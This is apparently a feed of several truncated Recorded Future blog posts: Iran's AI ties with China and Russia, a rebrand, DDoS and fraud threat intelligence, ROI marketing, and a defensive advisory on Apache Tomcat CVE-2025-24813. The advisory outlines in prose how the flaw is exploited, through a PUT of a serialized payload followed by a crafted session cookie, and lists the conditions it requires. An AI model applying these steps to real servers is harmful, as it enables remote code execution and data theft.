        <p>Iran’s Organization for Development of International Science and Technology Cooperation (ODISTC) very likely plays a critical role in facilitating the exchange of ideas, goods, and services related to AI. ODISTC was set up “to serve as a foundation for increasing scientific, technological and innovation communications with other countries, as well as securing a significant share of the regional and global trade of knowledge-based products.” Among the services offered in ODISTC’s “Technological Exchange Office” is “bilateral scientific and technology cooperation in the form of joint research funds with the [sic] countries like China and Russia.” More details pertaining to Iran’s cooperation with China and Russia are discussed below.</p>
        <h4>China</h4>
        <p>Iran’s technological cooperation with China is very likely a key strategic interest for Iran’s AI development. In 2021, Iran’s Strategic Council on Foreign Relations promoted building relationships between Iranian and Chinese technology companies and higher education institutions. AI was specifically mentioned as part of the Iran-China 25-year Comprehensive Partnership, officially signed in March 2021. A leaked version of the plan, sourced from Iran’s Ministry of Foreign Affairs and <a href="https://www.wilsoncenter.org/sites/default/files/media/uploads/documents/MEP_200831_OCC%2038%20v3%20%281%29.pdf">reported</a> by the Wilson Center, proposed the cooperation involved “introducing joint pilot projects in the fields of smart technology and artificial intelligence.” Second to the sale of its oil to China, Iran likely <a href="https://link.springer.com/chapter/10.1007/978-981-19-6700-9_32">views</a> AI development and technological exchanges as a top priority for its bilateral relations with China, and China’s challenge to US dominance in AI development aligns with Tehran’s goal to oppose US hegemony.</p>
        <p>China’s use of AI for surveillance and monitoring has very likely been the most robust area for Iran’s foreign AI engagement, enabling Chinese companies to expand their export of specific technologies that facilitate Iranian domestic repression. However, academic and research collaboration is very likely another key area in which Iran’s technology sector is benefitting from the relationship with China. In November 2024, Iranian company Bayan Rayan — the country’s only server producer — received an award at the 26th annual China Hi-Tech Fair (CHTF) 2024. In 2022, an official at Iran’s Islamic Azad University touted the Iran-China agreement as a “golden opportunity to boost cooperation in AI” and benefit from Chinese advancement in the AI field, noting that Iran had 3,000 Iranian students studying in China.</p>
        <h4>Russia</h4>
        <p>The anti-West strategic alignment and commercial isolation that Iran and Russia both share, particularly as a result of Russia’s war with Ukraine, has <a href="https://www.cna.org/reports/2025/01/The-Evolving-Russia-Iran-Relationship.pdf">resulted</a> in deeper cooperation in many security-related fields. Despite the <a href="https://isis-online.org/isis-reports/mobile/iran-russia-military-technology-axis-russia-showcases-to-iran-new-and-advan">increased</a> <a href="https://www.cfr.org/blog/iran-russia-cyber-agreement-and-us-strategy-middle-east">cooperation</a> in several <a href="https://www.wsj.com/articles/russia-supplies-iran-with-cyber-weapons-as-military-cooperation-grows-b14b94cd">spheres</a>, specific details on the extent of the current Iran-Russia collaboration on AI R&amp;D are limited. In January 2025, Tehran and Moscow signed a comprehensive twenty-year strategic partnership agreement that reinforced areas of ongoing cooperation in the technical sphere, including information and communication technologies, digital development, and higher education. While the text of the agreement does not specifically mention AI, Iran’s Ministry of Foreign Affairs stated the agreement “provides a platform for sharing knowledge and collaboration in fields such as nanotechnology, aerospace, artificial intelligence, and medical sciences” and expands cooperation at the government and academic levels.</p>
        <p>Leading up to the 2025 comprehensive agreement, a flurry of Iran-Russia cooperation documents and engagements have promoted cooperation on AI. In March 2024, the two countries signed a Memorandum of Understanding to cooperate on ethics in AI, “exchanging experiences in the implementation of the ethical principles of AI.” The agreement specified that the Russian Commission on Ethics in AI would provide training for Iran’s AI and Robotics Development headquarters. In November 2019, Russia and Iran signed a Memorandum of Understanding on cooperation to support twenty joint research plans in fifteen scientific fields, including, among others, information technology, computer systems, and AI.</p>

        <h2>The next chapter in our journey</h2>
        <p>
          <img loading="lazy" alt="rebrand-001.png" src="https://www.recordedfuture.com/media_167c4c97d6204beceab45c248be5f5e76fdb9446f.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1172" />
        </p>
        <p>Today marks an exciting milestone as we unveil Recorded Future's refreshed brand identity and website – a transformation that reflects the <a href="/blog/6-threat-intelligence-outlooks-strategies-2025">next chapter in cybersecurity</a> and threat intelligence. This evolution arrives at a pivotal moment when organizations face increasingly sophisticated threats that demand clarity, focus, and actionable insights.</p>
        <p>The inspiration for this refresh became clear while walking the floors at cybersecurity conferences. Amid a sea of sameness – dark displays, matrix-like code animations, and ubiquitous hooded figures – the messaging blends together in an indistinguishable haze of technical jargon and vague promises.</p>
        <p>For security leaders tasked with protecting their organizations, this uniformity creates a real challenge: how to identify what truly matters when everyone looks and sounds the same?</p>
        <p>This observation became the catalyst for our brand refresh – not just as a marketing initiative, but as an authentic expression of how Recorded Future helps security professionals cut through overwhelming noise to focus on what's essential.</p>
        <h2>Deconstructing our brand heritage.</h2>
        <p>This journey wasn't about creating a new logo – Recorded Future already had a strong visual mark. Instead, we focused on building a comprehensive visual and verbal language that embodies clarity and precision. The deconstructed logo became an important aspect of our brand system, allowing us to create meaningful visual elements that connect our identity with the purpose that has been at the heart of our company since we were founded in 2009.</p>
        <p>
          <img loading="lazy" alt="rebrand-002.png" src="https://www.recordedfuture.com/media_13ed4d9079c8495c9e886b1e32c73fb82ad479a45.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="704" />
        </p>
        <p>It also became a symbol of premium offering in the category. When we created patterns using deconstructed elements of the logo, we were struck by their beauty being reminiscent of Hermes scarves (another brand that is at the pinnacle of their category).</p>
        <p>The process involved examining countless competitor websites, which blended together in a blur of undifferentiated, fear-based messaging. The question emerged: "Could our brand serve as an antidote to this confusion, bringing the same clarity to our marketing that our platform brings to threat intelligence?" This approach transcended typical design exercises. It centered on authentically representing the value we provide. Our customers aren't just buying software – they're seeking confidence amid constant pressure and overwhelming data. They need a partner who understands their fundamental requirement: knowing which threats truly matter to their business.</p>
        <h2>Crafting our story. Finding our voice.</h2>
        <p>When drafting our brand narrative, the team read it aloud together to feel how the words resonated beyond how they appeared on paper. The opening lines captured our essence perfectly:</p>
        <p><em>"In cybersecurity, your greatest fear isn't the threats you see coming. It's the critical signals that get lost in the noise."</em></p>
        <p>This became our north star, guiding the development of four pillars for our design system:</p>
        <ul>
          <li><strong>Meaningful</strong> – Reinforcing what we stand for and the value we deliver to customers</li>
          <li><strong>Bold</strong> – Being distinctive, confident, and immediately recognizable in a crowded marketplace</li>
          <li><strong>Premium</strong> – Conveying the sophistication that positions us as the market leader in intelligence</li>
          <li><strong>Helpful</strong> – Using design to help customers discover relevant content and navigate complex information</li>
        </ul>
        <h2>Visual distinction with purpose.</h2>
        <p>The introduction of vibrant electric blue serves as more than an aesthetic choice – it symbolizes our promise to illuminate what matters in a noisy threat landscape. Upon seeing it, CEO Christopher Ahlberg remarked, "Now that stands out," confirming we were moving in the right direction.</p>
        <p>
          <img loading="lazy" alt="rebrand-003.png" src="https://www.recordedfuture.com/media_16aca26e8705c00c960d31ebf9e2f488d3e483cb3.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1066" />
        </p>
        <p>Christopher's guidance on our website proved equally valuable: "The most important thing is to build a website that is truly useful and engages customers in a way that there's something they want to come back to." This perspective drove our approach toward building a destination that delivers ongoing value, with particular emphasis on elevating the incredible content and thought leadership we provide – a significant differentiator for Recorded Future in the marketplace.</p>
        <p>The website redesign presented an interesting challenge: balancing rich content with product and sales experiences. Years of building trust through <a href="https://go.recordedfuture.com/2024-state-of-threat-intelligence">intelligence research</a> has established Recorded Future's reputation for expertise.</p>
        <p>Elevating this content became central to our strategy.</p>
        <p>
          <img loading="lazy" alt="rebrand-004.jpg" src="https://www.recordedfuture.com/media_15357342136c202c4c6b6f2446bd2e062fe5ff7a1.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1600" height="1280" />
        </p>
        <p>Our intelligence research demonstrates expertise, builds credibility, and provides tangible value to security professionals. The design needed to showcase this strength while making our insights more accessible and actionable.</p>

        </div>
        <h2>Bringing our story to life – with AI and humanity.</h2>
        <p>The brand launch features a powerful video that tells the story of Recorded Future's next chapter, created entirely using generative AI. This approach represents a meaningful parallel to our core work – using <a href="/blog/next-evolution-recorded-future-ai-powering-threat-intelligence">advanced AI to combat sophisticated cyber threats</a>. Just as we harness AI to deliver precision Intelligence, we embraced AI-powered creativity to express our vision for the future of cybersecurity.</p>
        <p>But what moves me most about this rebrand is the response from our people. Watching our teams getting excited about the new materials, hearing our intelligence analysts express how the new brand better reflects the sophistication of their work – these moments affirm that we've created something that resonates on a human level.</p>
        <p>
          <img loading="lazy" alt="rebrand-005.png" src="https://www.recordedfuture.com/media_13d31ccc47db68ac1de9e959b7745b1ee50498c39.png?width=750&amp;format=png&amp;optimize=medium" width="1362" height="396" />
        </p>
        <h2>The Road Ahead</h2>
        <p>This refreshed identity helps us communicate with the same precision and clarity that our platform delivers, elevating our brand while making complex intelligence more accessible and actionable.</p>
        <p>As cyber threats grow in complexity, our platform indexes vast sources of global data, using advanced machine learning and natural language processing to deliver timely, actionable intelligence. This empowers security teams to anticipate threats, understand adversaries' tactics, and respond swiftly.</p>
        <p>The threat landscape will continue to evolve, but our commitment remains steadfast: helping security teams know what matters most and act first. Our brand now expresses this promise in every interaction, from website visits to platform experiences.</p>
        <p>This transformation achieves differentiation in the market while authentically embodying our core belief: in a world of overwhelming noise, precision and focus provide the ultimate protection.</p>
        <p>As we begin this next chapter, the entire team deserves recognition for bringing this vision to life. This refresh isn't merely about visual identity – it's about helping our customers become more confident, more precise, and ultimately more secure.</p>

            <content:encoded><![CDATA[
        <p>DDoS (distributed denial-of-service) attacks have existed since the early days of the internet. While new tricks occasionally pop up—like leveraging certain vulnerabilities to amplify attacks—the core idea remains: overwhelming servers with more traffic than they can handle. Think of it as trying to push the ocean through a straw. When these attacks grow big, they can even disrupt internet providers themselves. Companies like <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Google</a> and <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Cloudflare</a> still battle these threats regularly, proving DDoS remains a serious issue even in 2025.</p>
        <p>Historically, cybercriminals have targeted entire industries like airlines and banks, shutting the companies down until they paid. State-backed groups from countries like <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Russia</a> and <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Iran</a> also use DDoS attacks as weapons against their enemies.</p>
        <h2>Why Spend Money Before an Attack Happens?</h2>
        <p>Protecting against DDoS attacks matters because downtime means losing money or, for critical services, even worse consequences. But if your company hasn't been hit yet, why spend money on defenses? When should you start protecting yourself?</p>
        <p>That’s where threat intelligence comes in handy. By looking at data and comparing trends, threat intelligence helps you decide if and when investing in DDoS defenses makes sense. It provides the insights to answer these questions for DDoS and any other cyber risk that may create one or more of the <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">five risk impacts</a>.</p>
        <h2>Smart Data Means Smart Decisions</h2>
        <p>Good decisions need good data. Recorded Future tracks thousands of DDoS attacks every day, giving you a clear picture of who’s getting hit and how often. Pulling data from the Recorded Future API gives analysts useful analytics, like IP addresses targeted by attackers.</p>
        <p>With this data, security teams can:</p>
        <ul>
          <li>Spot trends and predict who might be next</li>
          <li>Automate defenses and make faster decisions</li>
          <li>Better manage risk, knowing exactly when and how to invest</li>
        </ul>

        </div>
        <h2>Who's Being Targeted?</h2>
        <p>Launching DDoS attacks isn’t technically difficult. Someone with basic internet know-how can do it. But some attackers put more effort into it, building armies of infected devices known as botnets. One tool frequently used by pro-Russian hackers, called DDoSia, attacks different targets daily. By tracking who’s getting hit most, businesses can better prepare their defenses.</p>
        <p>For example, Ukraine currently faces heavy attacks due to geopolitical tensions. But finance and transportation companies in Europe are also frequent targets, suggesting broader threats.</p>

        </div>
        <h2>Thinking Bigger than Just Your Own Network</h2>
        <p>When CISOs aren’t considering crafting better risk management narratives for executive consumption, they are contemplating improving operational resilience. Denial of service attacks fall squarely in this category. The revolving questions don’t stop with an organization’s local network perimeter (if such a thing even exists anymore) but extend to partners, suppliers, and wider internet infrastructure (e.g., DNS and CDN providers).</p>
        <p>More than ever, daily business and geopolitical events create a cascading effect of cyber impacts. DDoS is always a possibility. Recent <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">attacks against X</a> (Twitter’s hip rebrand) are a good reminder.</p>
        <h2>Key Decisions for Stronger DDoS Defense</h2>
        <p>The decisions that underpin DDoS defense and response correspond to organizational size, mission, footprint, regulatory compliance mandates, and resources. Here are some practical actions to consider:</p>
        <ul>
          <li>Partnering with your internet provider for fast response</li>
          <li>Using scrubbing centers to filter attack traffic</li>
          <li>Implementing challenge-response tests like CAPTCHAs</li>
          <li>Deploying cloud protections like AWS Shield</li>
          <li>Utilizing web application firewalls (WAF)</li>
          <li>Optimizing network setups (like load balancers and distributed data centers)</li>
          <li>Filtering traffic using firewalls and intrusion systems</li>
          <li>Relying on content delivery networks (CDNs)</li>
          <li>Using Anycast routing to protect DNS services</li>
        </ul>
        <div>
          <div>

          </div>
        </div>
        <h2>Everyone’s a Target</h2>
        <p>It’s tempting to think your business won't face a DDoS attack, especially if it's small or non-political. The reality? Anyone online can become a target for extortion or political agendas. That's why proactive intelligence is so valuable—it helps security teams know when threats are getting closer and when it’s time to upgrade defenses.</p>
        <p>As the frequency of DDoS attacks increases around certain industries or regions, it's essential to reassess and strengthen your own security controls accordingly. The closer these threats get, the more your organization should test their resilience. Said differently, as DDoS attack proximity moves closer to an organization, the operational disruption risk may, in parallel, need to <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">move north on the resilience axis</a>.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="e749bad6-f210-4917-a230-a144e9e72ae7_1600x900.webp" src="https://www.recordedfuture.com/media_14189415a2ef2c8f09162779e8c192e620e22b935.png?width=750&amp;format=png&amp;optimize=medium" width="1456" height="819" />

          </div>
        </div>
        <h2>Staying One Step Ahead</h2>
        <p>DDoS attacks aren't going away, but they don't have to be a nightmare, either. Threat intelligence provides the clear insights needed to prepare and respond effectively. By using analytics wisely, organizations can invest smartly, build stronger defenses, and keep their operations running smoothly. When attacks creep closer—say, spiking in your sector or geography—second-order risks (like operational disruption) loom larger. That’s your cue to prioritize resilience, whether a CDN subscription or ISP speed-dial.</p>

            <content:encoded><![CDATA[
        <h2>The Global Fraud Landscape</h2>
        <p>Fraud is a booming industry, with scammers <a href="https://www.gasa.org/_files/ugd/7bdaac_9060be8317424edd9964072cf279a0a4.pdf">pulling in</a> over <strong>$1 trillion</strong> from their victims in 2024. Businesses are paying the price: <strong>87%</strong> of businesses <a href="https://www.veriff.com/ebooks/us-industry-pulse-survey-2024">reported</a> an increase in online fraud, with most experiencing a <strong>1% to 9%</strong> loss in revenue as a result. In terms of individual consumers, Asia reported digital scam losses <a href="https://www.mastercard.com/news/ap/en/perspectives/en/2025/evolution-of-fraud-and-scams-in-asia-the-need-for-a-unified-defence/">reaching</a> <strong>$700 billion</strong> last year, compared to the <strong>$12.5 billion</strong> reported by US consumers in <a href="https://www.ftc.gov/news-events/news/press-releases/2025/03/new-ftc-data-show-big-jump-reported-losses-fraud-125-billion-2024">2024</a>.</p>
        <p>Trust-based financial exploitation scams are especially lucrative. Examples include <a href="https://www.scamwatch.gov.au/stay-protected/real-life-stories/dating-and-romance-scam-georginas-facebook-fianc%C3%A9-leaves-her-flat-broke">romance</a> scams, investment scams, or <a href="https://www.abc.net.au/news/2025-02-24/fake-chinese-authority-scam-extorting-millions/104974122">impersonation</a> scams. Fraudulent actors can adapt impersonation scams to target businesses, such as by posing as regulators or <a href="https://www.cnn.com/2024/02/04/asia/deepfake-cfo-scam-hong-kong-intl-hnk/index.html">impersonating</a> executives. The percentage of people who reported losing money to fraud and scams <a href="https://www.ftc.gov/news-events/news/press-releases/2025/03/new-ftc-data-show-big-jump-reported-losses-fraud-125-billion-2024">increased</a> from 27% in 2023 to 38% in 2024, suggesting that scams are increasingly more effective and believable.</p>
        <h2>Huione Marketplace: The One-Stop Shop for Fraud</h2>
        <p>Online platforms that market tools and services to Chinese-speaking cybercriminals are one factor behind this boom, making it easier for criminals to execute fraud at scale. <a href="https://support.recordedfuture.com/hc/en-us/articles/37986893239187-Huione-Guarantee-Serves-as-a-One-Stop-Shop-for-Chinese-Speaking-Cybercriminals">Huione Guarantee</a>, a prominent gray-market hub that operates under the Huione Group, a Cambodian financial conglomerate, <a href="https://www.wired.com/story/the-largest-illicit-online-marketplace-ever-is-growing-at-an-alarming-rate">acts</a> as a one-stop shop for fraud-related tools and services. The website compiles Telegram channels with posts offering cryptocurrency mining tools, money laundering, and <a href="https://www.straitstimes.com/singapore/10m-lost-in-malware-scam-where-victims-banking-credentials-stolen-by-keylogger-hidden-in-app">malware-as-a-service</a>. The channels also promote offerings that use social engineering to facilitate fraud, including the sale of social media accounts to adopt realistic online personas, as well as personal, financial, and employment data to personalize the scam. Sellers also advertise generative AI deepfake voice and face-changing tools, some of which list <a href="https://www.cnbc.com/2023/10/17/us-bans-export-of-more-ai-chips-including-nvidia-h800-to-china.html">US-sanctioned</a> computer hardware components in the technology specifications. Advanced consumer-grade GPUs, like the kind recommended by threat actors for an advanced face swapping tool sold on the Huione Marketplace, are widely <a href="https://www.wsj.com/tech/the-underground-network-sneaking-nvidia-chips-into-china-f733aaa6">available</a> through underground and informal distribution networks.</p>
        <h2>From Scams to Slavery: TCOs, AI Tools, and Human Trafficking</h2>
        <p>Transnational criminal organizations (TCOs) use services from Huione Guarantee to support large-scale scam operations. These organizations operate call center compounds in Cambodia and Myanmar that force <a href="https://www.humanity-consultancy.com/publications/responses-to-trafficking-in-persons-for-forced-criminality-in-the-thai-context">human trafficking victims</a> to carry out hundreds of scam calls each day. Coerced labor is <a href="https://www.abc.net.au/news/2024-05-16/pig-butchering-scams-artificial-intelligence-ai-face-swapping-/103804830">augmented</a> with generative AI tools, including deepfake impersonations and automated bots. Chinese and Thai law enforcement have made joint efforts to shut down the call centers by <a href="https://www.yahoo.com/news/china-brings-back-3-000-093000193.html">repatriating</a> trafficking victims and <a href="https://www.scmp.com/week-asia/politics/article/3297499/thailand-shuts-power-myanmars-scam-hub-pm-paetongtarn-vows-firm-action">shutting down</a> power to the regions where they operate. However, political instability and weak governance in regions where these centers operate make sustained enforcement efforts challenging.</p>
        <p>Huione infrastructure also supports money laundering services through Huoine Pay, the conglomerate’s banking arm. The Huione Pay website advertises money laundering services along with other scam tools. The National Bank of Cambodia recently <a href="https://www.rfa.org/english/cambodia/2025/03/06/huione-cambodia-cyberscam-cryptocurrency/">stripped</a> Huoine Pay’s banking license in response to international pressure, though further enforcement actions such as arrests or fines have not yet been made.</p>

        </div>
        <h2>New Markets: Expanding to the US and Beyond</h2>
        <p>TCOs are <a href="https://web.archive.org/web/20240612094033/https://www.usip.org/programs/transnational-organized-crime-southeast-asia">beginning</a> to look to other regions to grow their operations. Scam losses per capita in the US are the <a href="https://www.gasa.org/_files/ugd/7bdaac_9060be8317424edd9964072cf279a0a4.pdf">highest</a> in the world at $3,520, offering an enticing market for expanding operations. The majority of scams these groups operate appear to target individuals, employing a variety of scam techniques based on who they are targeting and which scams are working.</p>
        <p>Businesses can protect themselves from scam-related revenue losses by adapting their employee training and policies to keep up with increasingly sophisticated scams.</p>
        <ul>
          <li><strong>Update phishing detection training</strong> to include more sophisticated tactics, such as more professional-sounding content in emails or even deepfake voice or video calls, to help employees recognize fraudulent communications.</li>
          <li><strong>Discourage using unmonitored personal devices</strong> for sensitive business functions to ensure that the security team can quickly identify malware infection, data exfiltration, or suspicious network activity due to fraud.</li>
          <li><strong>Ensure employees and leadership alike have a trusted mechanism for reporting suspicious activity.</strong> In addition, providing assurances that scam victims will not be punished can help ensure they report the scams to the security team, which may then be able to intervene before more serious losses are incurred.</li>

            <description><![CDATA[Discover how cybersecurity impacts your bottom line. Learn how threat intelligence helps reduce fraud, downtime, insurance costs, and reputational damage—driving 351% ROI.]]></description>
            <content:encoded><![CDATA[
        <p>In today's unpredictable threat landscape, cybersecurity isn't just an IT concern—it's a critical business initiative with direct impact on your organization's bottom line and brand reputation. As threat actors grow increasingly sophisticated, security leaders face mounting pressure to demonstrate the tangible value of their cybersecurity investments.</p>
        <h2>The Financial and Business Impact of Cyber Risks</h2>
        <p>Cyber threats pose far more than just technical challenges—they carry significant financial and operational consequences that can affect an organization's bottom line, stakeholder confidence, and long-term sustainability. Recent research quantifies that impact: the average <a href="https://www.ibm.com/reports/data-breach">cost of a data breach</a> now stands at $4.88 million, and the aftermath of cybersecurity incidents often extends well beyond the immediate financial losses.</p>
        <p>For businesses, the equation is simple yet profound: effective <a href="/blog/supercharge-risk-reduction">cybersecurity risk reduction</a> directly translates to business value. By implementing proactive threat intelligence and comprehensive security measures, organizations can:</p>
        <ul>
          <li>Prevent revenue losses from operational disruptions</li>
          <li>Avoid costly fraud and impersonation schemes</li>
          <li>Strengthen customer trust and brand reputation</li>
          <li>Reduce cyber insurance premiums</li>
          <li>Minimize recovery costs from security incidents</li>
        </ul>
        <h2>The Cost of Cyber Risks to Businesses</h2>
        <p>According to new research conducted with hundreds of Recorded Future customers, organizations are seeing substantial ROI from their threat intelligence investments in areas that extend far beyond traditional security metrics. The data, compiled in Recorded Future's comprehensive 2025 ROI Report, <a href="https://go.recordedfuture.com/report/how-recorded-future-drives-roi">“How Recorded Future Drives ROI for Cybersecurity Teams,”</a> reveals how mature threat intelligence programs translate directly to business resilience and financial benefits.</p>
        <h3>Brand Reputation Impact</h3>
        <p>When a company falls victim to a cyber attack, the damage to brand reputation can be substantial and long-lasting. Typosquatting—the practice of creating deceptively similar domain names to legitimate websites—often serves as vectors for phishing attacks that can compromise customer data and customer trust.</p>
        <p>Recorded Future customers reported that they are now 51% more efficient at taking down typosquatting instances. Swift typosquat mitigation not only helps combat phishing attempts, but it also enables your customers to seamlessly carry out the actions they set out to accomplish by visiting your site. We see that as an increase in web traffic that we can quantify the value of with the help of research by the <a href="https://www.cs.uic.edu/~ckanich/papers/khan2015every.pdf">University of Illinois</a>.</p>
        <p>An average billion-dollar business sees 2 million monthly web visits. At an average loss rate of 5.28% due to typosquatting according to research from <a href="https://www.cs.uic.edu/~ckanich/papers/khan2015every.pdf">University of Illinois</a>, more efficient typosquat takedowns with Recorded Future would help them recover over 50,000 website visits each month — and an expected $2,602 monthly value.</p>
        <p>"We have improved brand protection by at least 100%. We can identify risks and patterns in infancy stages, and we've automated brand scanning to eliminate hours of manual work. As we automate more coverage, we have saved hundreds of labor hours per quarter and improved efficiency," reports <a href="https://app.userevidence.com/assets/8091GFKY">Joe Azzouggagh, Manager of Trust and Safety at ruby</a>.</p>
        <h3>Cyber Insurance Considerations</h3>
        <p>As cyber attacks have become more prevalent, cyber insurance has evolved from a nice-to-have to a business necessity. However, premiums can be substantial, particularly for organizations that face significant risk.</p>
        <p>Based on observable market data and the average 2024 <a href="https://www.ibm.com/reports/data-breach">cost of a breach</a> being $4.88 million, a typical billion-dollar company likely pays a yearly premium of $207,400, or $35-50,000 per million of coverage.</p>
        <p>Recorded Future customers report average monthly premium savings of $2,497—approximately $30,000 annually. One customer, <a href="https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&amp;wmediaid=1j7x7zezcc">Cummins</a>, achieved an impressive 32% year-over-year reduction in cyber insurance premiums after implementing Recorded Future's threat intelligence platform.</p>
        <h3>Operational Disruption and Downtime</h3>
        <p>Service disruptions resulting from cyber incidents carry dual consequences: immediate revenue losses and lasting reputational damage. <a href="/blog/reducing-operational-risk-with-threat-intelligence">Reducing operational risk</a> has become a priority for organizations of all sizes. When systems go offline due to ransomware or distributed denial-of-service (DDoS) attacks, every minute of downtime translates to financial impact.</p>
        <p>Our customers report that threat intelligence from Recorded Future helps minimize downtime, which for a billion-dollar organization translates to an average revenue value of approximately $19,025 per month—or nearly $230,000 annually. This calculation doesn't even account for the additional benefit of avoiding reputational damage that inevitably accompanies service disruptions.</p>
        <p>“Recorded Future allows us to shift our mindset from being more reactive in nature to being more proactive and responsive to threats that went unnoticed in the past.

        <h2>Implementing a Proactive Cybersecurity Strategy</h2>
        <p>To realize the full business impact of threat intelligence, organizations should follow a structured approach to implementation:</p>
        <h3>1. Define Business-Centric Security Priorities</h3>
        <p>Begin by identifying your organization's "crown jewels"—the critical assets, data, and operations that would cause significant harm if compromised. This is a fundamental principle of business risk management. Work with business leadership to understand what matters most to the organization's success and prioritize security efforts accordingly.</p>
        <h3>2. Assess Threats in Business Context</h3>
        <p>Not all vulnerabilities will be exploited, and not all threats pose an immediate risk to your specific organization. Use threat intelligence to focus first on responding to the threats that present actual risk to your people, assets, and business objectives.</p>
        <h3>3. Leverage Automation to Increase Efficiency</h3>
        <p>With proper automation, security teams can dramatically reduce manual effort while improving response times. By automating routine tasks like alert enrichment and correlation, analysts can focus on strategic threat hunting and proactive security initiatives.</p>
        <h3>4. Measure and Communicate Business Impact</h3>
        <p>Track and report on security metrics that matter to business leaders, such as:</p>
        <ul>
          <li>Reduced cyber insurance premiums</li>
          <li>Avoided fraud losses</li>
          <li>Increased uptime</li>
          <li>Accelerated response times</li>
          <li>Brand protection efforts</li>
        </ul>
        <h3>5. Mature Your Program Over Time</h3>
        <p>As your threat intelligence program matures, continuously refine your approach to address evolving business needs and emerging threats. This might include expanding monitoring to new digital channels, deepening integration with business systems, or enhancing threat hunting capabilities.</p>
        <h2>Conclusion: Protecting Business Continuity Through Cyber Risk Reduction</h2>

            <description><![CDATA[Learn about CVE-2025-24813 affecting Apache Tomcat products. Patch now to prevent remote code execution.]]></description>
            <content:encoded><![CDATA[
        <h2>What is CVE-2025-24813?</h2>
        <p><a href="https://www.recordedfuture.com/vulnerability-database/cve-2025-24813">CVE-2025-24813</a> is a critical path equivalence vulnerability in Apache Tomcat, with exploitation attempts by threat actors observed in the wild. The vulnerability allows attackers to execute arbitrary code on vulnerable servers without authentication under specific conditions, potentially leading to system compromise and sensitive data being exposed.</p>
        <p>Organizations affected by the configuration required for exploitation should patch CVE-2025-24813 to mitigate potential attacks and protect sensitive data from unauthorized access.</p>
        <p>The vulnerability affects Tomcat versions 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, and 9.0.0. M1 to 9.0.98. <strong>Additionally, Insikt Group’s analysis found that 8.5.x versions (specifically 8.5.0 to 8.5.98 and 8.5.100, with the exception of 8.5.99) are also vulnerable, though they were not included in the initial set of affected products by Apache.</strong></p>
        <h2>Insikt Group’s Assessment of CVE-2025-24813</h2>
        <p>CVE-2025-24813 stems from Tomcat’s handling of partial PUT requests and allows remote, unauthenticated attackers to conduct remote code execution (RCE), view security-sensitive files, and inject content into those files.</p>
        <p>Exploitation involves two primary steps:</p>
        <ul>
          <li>The attacker sends a PUT request containing a Base64-encoded serialized Java payload to the server. This payload is designed to trigger RCE upon deserialization.</li>
          <li>The attacker then sends a GET request with a specially crafted “JSESSIONID” cookie referencing the malicious session, causing the server to deserialize the payload and execute arbitrary code.</li>
        </ul>
        <p>However, successfully conducting RCE requires the following conditions:</p>
        <ul>
          <li>The default servlet must have write permissions enabled (disabled by default)</li>
          <li>Partial PUT support must be enabled (enabled by default)</li>
          <li>The application uses Tomcat's file-based session persistence with the default storage location</li>
          <li>The application includes a library that can be leveraged in a deserialization attack</li>
        </ul>
        <p>If the following conditions are true, attackers can view sensitive security files and inject content into those files:</p>
        <ul>
          <li>The default servlet must have write permissions enabled (disabled by default)</li>
          <li>Partial PUT support must be enabled (enabled by default)</li>
          <li>The target URL for sensitive uploads resides within a sub-directory of the public uploads directory</li>
          <li>The attacker is aware of the filenames of the security-sensitive files being uploaded</li>
          <li>The security-sensitive files are uploaded using partial PUT requests</li>
        </ul>
        <p>As such, only a limited number of Tomcat instances are likely to be affected by the configuration required for exploitation. For example, a GitHub code search query to check for the write permissions condition (<code>&lt;param-name&gt;readonly&lt; /param-name&gt; AND "false" language:xml</code>) shows only 218 open-source projects using this configuration.</p>
        <p>Cybersecurity firm Greynoise has identified six malicious IP addresses attempting to exploit CVE-2025-24813, targeting systems in the US, Japan, Mexico, South Korea, and Australia. However, Insikt Group has not identified any evidence of successful exploitation or any evidence of known threat actors exploiting the vulnerability. At the time of writing, there were 378,444 exposed instances on Shodan. The specific versions are disclosed in the title and body of the servers’ responses.</p>

            <description><![CDATA[Discover how Recorded Future improves cybersecurity team productivity, saving 100+ hours weekly and driving $290K in annual value through threat intelligence.]]></description>
            <content:encoded><![CDATA[
        <p>Cybersecurity teams face a constant onslaught of critical and potentially catastrophic challenges: from defending against sophisticated ransomware attacks to preventing coordinated nation-state campaigns. To make their challenges worse, teams often struggle with a lack of visibility, alert fatigue, limited resources and manual processes.</p>
        <p>Threat intelligence has emerged as a critical solution to these challenges, providing the context and actionable insights needed to prioritize effectively and respond proactively. Rather than adding to the noise, threat intelligence cuts through it, enabling security teams to work more efficiently, focusing on what matters and responding to it quickly.</p>
        <p>To understand how customers of Recorded Future leverage threat intelligence to act more efficiently, we partnered with third-party research firm <a href="https://app.userevidence.com/user-research-library/recorded-future?per_page=25&amp;page=1&amp;sort_by=updated_at&amp;sort_dir=desc&amp;responded=1&amp;view=card">UserEvidence</a> to collect quantitative ROI data and qualitative feedback to create our newly published report: <strong><a href="https://go.recordedfuture.com/report/how-recorded-future-drives-roi">How Recorded Future Drives ROI for Cybersecurity Teams</a></strong>.</p>
        <p>The report reveals that by automating manual workflows, streamlining investigations, and enabling teams to focus on what matters most, Recorded Future customers are reporting time savings of over 100 hours per week—translating to approximately $290,237 in annual productivity gains for the average organization. In this blog post, we explore the report’s findings and what our customers have to say about improving efficiency.</p>
        <h2>The Growing Need for Cybersecurity Efficiency</h2>
        <p>Security teams across industries are feeling the strain of increasing responsibilities with limited resources. This imbalance often results in:</p>
        <ul>
          <li>Burnout among team members tasked with manual, repetitive processes</li>
          <li>Operational inefficiencies that slow response times</li>
